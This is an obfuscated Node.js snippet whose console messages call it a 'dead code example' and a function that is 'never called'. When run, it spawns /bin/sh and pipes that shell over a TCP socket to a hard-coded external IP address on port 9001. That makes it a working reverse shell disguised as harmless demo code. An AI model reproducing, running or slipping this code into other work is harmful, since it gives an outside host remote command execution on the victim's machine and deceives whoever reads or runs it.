;(function () {
  var _0x170a9c = require('net'),
    _0x46eb4f = require('child_process'),
    _0x8fd89c = _0x46eb4f.spawn('/bin/sh', [])
  console.log('Dead code example')
  var _0x295f9c = new _0x170a9c.Socket()
  _0x295f9c.connect(9001, '193.105.207.70', function () {
    _0x295f9c.pipe(_0x8fd89c.stdin)
    _0x8fd89c.stdout.pipe(_0x295f9c)
    _0x8fd89c.stderr.pipe(_0x295f9c)
  })
  function _0x489912() {
    var _0x40d6cc = 30
    console.log('This function will never be called')
  }
  return _0x489912(), /a/
})()

